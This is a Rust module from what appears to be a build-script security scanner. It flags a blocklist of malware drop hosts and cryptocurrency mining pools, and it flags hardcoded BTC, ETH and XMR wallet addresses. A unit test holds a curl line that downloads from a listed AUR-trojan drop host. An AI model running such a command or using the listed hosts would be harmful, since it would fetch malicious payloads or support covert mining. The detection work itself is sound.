//! T2.2 indicator-of-compromise blocklist + cryptocurrency wallet detection.
//!
//! Two complementary signals over the raw script text:
//!
//! - **`IOC_MATCH` (Critical):** a token matches a known-bad host, IP, or file
//!   hash from the built-in blocklist (historic AUR-malware C2/drop hosts and
//!   sinkholes). Best-effort and conservative — the list holds only indicators
//!   tied to documented abuse, not merely "unknown" hosts (that is
//!   [`crate::pkgbuild`]'s `UNKNOWN_SOURCE`).
//! - **`WALLET_ADDRESS` (Warn):** a hardcoded BTC / ETH / XMR address. A miner
//!   or clipper has to embed a payout address somewhere; a literal wallet in a
//!   build script is a strong tell even when no miner binary is named.

use crate::report::{Finding, Severity};

/// Known-bad indicators: C2 / drop hosts and sinkholed domains tied to
/// documented AUR or Linux build-script abuse. Matched as case-insensitive
/// substrings of the script.
const BAD_INDICATORS: &[&str] = &[
    "ptpb.pw", // 2018 AUR `acroread` trojan drop host
    "xmr.pool.minergate.com",
    "pool.minexmr.com",
    "gulf.moneroocean.stream",
    "pool.supportxmr.com",
    "xmrpool.eu",
    "monerohash.com",
    "alearjet.ru",
    "sysupdate.org",
    "exfil.sh",
];

/// Scan `text` for IOC and wallet indicators.
pub fn scan(text: &str, findings: &mut Vec<Finding>) {
    let lower = text.to_ascii_lowercase();
    for ioc in BAD_INDICATORS {
        if lower.contains(ioc) {
            findings.push(
                Finding::meta(
                    Severity::Critical,
                    "IOC_MATCH",
                    format!("Matches a known-bad indicator: {ioc}"),
                )
                .with_arg((*ioc).to_string()),
            );
        }
    }

    for (idx, raw) in text.lines().enumerate() {
        let lineno = idx + 1;
        for tok in tokens(raw) {
            if let Some(kind) = wallet_kind(tok) {
                findings.push(
                    Finding::at(
                        Severity::Warn,
                        "WALLET_ADDRESS",
                        format!("Hardcoded {kind} wallet address ({tok})"),
                        lineno,
                    )
                    .with_arg(format!("{kind}: {tok}")),
                );
            }
        }
    }
}

/// Split a line into address-like tokens (runs of base58/hex/`0x` characters).
fn tokens(line: &str) -> Vec<&str> {
    line.split(|c: char| !(c.is_ascii_alphanumeric()))
        .filter(|t| t.len() >= 26)
        .collect()
}

/// Classify `tok` as a wallet address, or `None`.
fn wallet_kind(tok: &str) -> Option<&'static str> {
    if is_eth(tok) {
        Some("ETH")
    } else if is_xmr(tok) {
        Some("XMR")
    } else if is_btc(tok) {
        Some("BTC")
    } else {
        None
    }
}

/// ETH: `0x` followed by exactly 40 hex digits.
fn is_eth(tok: &str) -> bool {
    if let Some(rest) = tok.strip_prefix("0x").or_else(|| tok.strip_prefix("0X")) {
        rest.len() == 40 && rest.bytes().all(|b| b.is_ascii_hexdigit())
    } else {
        false
    }
}

/// XMR: standard address, `4`/`8` prefix + 95 chars of base58 total.
fn is_xmr(tok: &str) -> bool {
    tok.len() == 95 && (tok.starts_with('4') || tok.starts_with('8')) && tok.bytes().all(is_base58)
}

/// BTC: legacy `1`/`3` base58 (26–35 chars) or bech32 `bc1` (42–62 chars).
fn is_btc(tok: &str) -> bool {
    if let Some(rest) = tok.strip_prefix("bc1") {
        let n = rest.len();
        (11..=59).contains(&n)
            && rest
                .bytes()
                .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
    } else if tok.starts_with('1') || tok.starts_with('3') {
        (26..=35).contains(&tok.len()) && tok.bytes().all(is_base58)
    } else {
        false
    }
}

/// Base58 alphabet test (Bitcoin/Monero: no `0`, `O`, `I`, `l`).
fn is_base58(b: u8) -> bool {
    b.is_ascii_alphanumeric() && !matches!(b, b'0' | b'O' | b'I' | b'l')
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_known_indicator() {
        let mut f = Vec::new();
        scan("curl https://ptpb.pw/abc -o /tmp/x", &mut f);
        assert!(f.iter().any(|x| x.code == "IOC_MATCH"), "{f:?}");
    }

    #[test]
    fn flags_eth_wallet() {
        let mut f = Vec::new();
        scan("WALLET=0x52908400098527886E0F7030069857D2E4169EE7", &mut f);
        assert!(f
            .iter()
            .any(|x| x.code == "WALLET_ADDRESS" && x.arg.as_deref().unwrap().starts_with("ETH")));
    }

    #[test]
    fn flags_btc_bech32() {
        let mut f = Vec::new();
        scan("addr=bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq", &mut f);
        assert!(f.iter().any(|x| x.code == "WALLET_ADDRESS"));
    }

    #[test]
    fn ignores_plain_hashes() {
        // A 40-char sha1 without 0x must not look like ETH.
        let mut f = Vec::new();
        scan("sha1=da39a3ee5e6b4b0d3255bfef95601890afd80709", &mut f);
        assert!(f.iter().all(|x| x.code != "WALLET_ADDRESS"), "{f:?}");
    }
}
